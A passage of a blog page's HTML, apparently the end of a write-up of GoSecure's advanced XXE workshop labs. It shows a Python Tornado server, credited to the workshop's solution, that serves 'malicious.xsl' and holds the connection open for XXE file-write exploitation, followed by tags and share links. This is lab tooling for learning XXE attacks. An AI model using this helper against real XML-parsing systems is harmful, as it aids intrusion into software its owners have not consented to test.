+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre style="background-color:#fff;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="language-python" data-lang="python"><span style="color:#998;font-style:italic">#!/usr/bin/env python3</span>
+
+<span style="color:#998;font-style:italic"># Source: https://github.com/GoSecure/xxe-workshop/blob/master/24_write_xxe/solution/slow_http_server.py</span>
+
+<span style="color:#000;font-weight:bold">from</span> <span style="color:#555">tornado.ioloop</span> <span style="color:#000;font-weight:bold">import</span> IOLoop
+<span style="color:#000;font-weight:bold">import</span> <span style="color:#555">tornado.web</span>
+<span style="color:#000;font-weight:bold">import</span> <span style="color:#555">time</span>
+
+<span style="color:#000;font-weight:bold">class</span> <span style="color:#458;font-weight:bold">MainHandler</span>(tornado<span style="color:#000;font-weight:bold">.</span>web<span style="color:#000;font-weight:bold">.</span>RequestHandler):
+    <span style="color:#000;font-weight:bold">def</span> <span style="color:#900;font-weight:bold">get</span>(<span style="color:#999">self</span>):
+
+        <span style="color:#000;font-weight:bold">with</span> <span style="color:#0086b3">open</span>(<span style="color:#d14">&#34;malicious.xsl&#34;</span>,<span style="color:#d14">&#34;r&#34;</span>) <span style="color:#000;font-weight:bold">as</span> <span style="color:#0086b3">file</span>:
+            <span style="color:#999">self</span><span style="color:#000;font-weight:bold">.</span>write(<span style="color:#0086b3">file</span><span style="color:#000;font-weight:bold">.</span>read())
+            <span style="color:#999">self</span><span style="color:#000;font-weight:bold">.</span>flush()
+            time<span style="color:#000;font-weight:bold">.</span>sleep(<span style="color:#099">99999</span>)
+            <span style="color:#999">self</span><span style="color:#000;font-weight:bold">.</span>finish()
+
+<span style="color:#000;font-weight:bold">if</span> __name__ <span style="color:#000;font-weight:bold">==</span> <span style="color:#d14">&#34;__main__&#34;</span>:
+    application <span style="color:#000;font-weight:bold">=</span>  tornado<span style="color:#000;font-weight:bold">.</span>web<span style="color:#000;font-weight:bold">.</span>Application([
+        (<span style="color:#d14">r</span><span style="color:#d14">&#39;/&#39;</span>, MainHandler),
+    ])
+    port <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">9999</span>
+    application<span style="color:#000;font-weight:bold">.</span>listen(port)
+    <span style="color:#000;font-weight:bold">print</span>(<span style="color:#d14">&#34;Listening on port &#34;</span><span style="color:#000;font-weight:bold">+</span><span style="color:#0086b3">str</span>(port))
+    IOLoop<span style="color:#000;font-weight:bold">.</span>instance()<span style="color:#000;font-weight:bold">.</span>start()
+</code></pre></td></tr></table>
+</div>
+</div>
+  </div>
+
+  
+<div>
+  <ul class="tags">
+  <li>
+    <a href="https://mxpapad.me/tags/xxe/" class="tag-link">xxe</a>
+  </li>
+  
+  <li>
+    <a href="https://mxpapad.me/tags/dtd/" class="tag-link">dtd</a>
+  </li>
+  
+  <li>
+    <a href="https://mxpapad.me/tags/oob/" class="tag-link">oob</a>
+  </li>
+  
+  <li>
+    <a href="https://mxpapad.me/tags/jar/" class="tag-link">jar</a>
+  </li>
+  
+  <li>
+    <a href="https://mxpapad.me/tags/gosecure/" class="tag-link">gosecure</a>
+  </li>
+  </ul>
+</div>
+
+
+
+  <div class="share-buttons">
+  <a class="twitter-share-button"
+     href="#"
+     title="Share on Twitter"
+     data-url="https://mxpapad.me/posts/xxe_workshop/xxe_workshop/"
+     data-text="Advanced XXE Labs (GoSecure)"><i class="fab fa-twitter"></i></a>
+
+  <a class="linkedin-share-button"
+     href="#"
+     title="Share on LinkedIn"
+     data-url="https://mxpapad.me/posts/xxe_workshop/xxe_workshop/"
+     data-text="Advanced XXE Labs (GoSecure)"><i class="fab fa-linkedin-in"></i></a>
+
+  <a class="facebook-share-button"
+     href="#"
+     title="Share on Facebook"
+     data-url="https://mxpapad.me/posts/xxe_workshop/xxe_workshop/"
+     data-text="Advanced XXE Labs (GoSecure)"><i class="fab fa-facebook"></i></a>
+
+  <a class="telegram-share-button"
+     href="#"
+     title="Share on Telegram"
+     data-url="https://mxpapad.me/posts/xxe_workshop/xxe_workshop/"
+     data-text="Advanced XXE Labs (GoSecure)"><i class="fab fa-telegram"></i></a>
+
+  <a class="pinterest-share-button"
+     href="#"
+     title="Share on Pinterest"
+     data-url="https://mxpapad.me/posts/xxe_workshop/xxe_workshop/"
+     data-text="Advanced XXE Labs (GoSecure)"><i class="fab fa-pinterest"></i></a>
+</div>
+
+
+  
+</div>
+  </main>
+
+  <footer>
+  <div>
+    <p>
+      &copy; ishtar 2021
+
+      &middot; <a href="https://creativecommons.org/licenses/by-sa/4.0" target="_blank">CC BY-SA 4.0</a>
+
+      
+    </p>
+  </div>
+</footer>
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/js/all.min.js"
+          integrity="sha256-MAgcygDRahs+F/Nk5Vz387whB4kSK9NXlDN3w58LLq0="
+          crossorigin="anonymous"></script>
+
+
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/soho.js"></script>
+
+  
+
+  
+</body>
+</html>
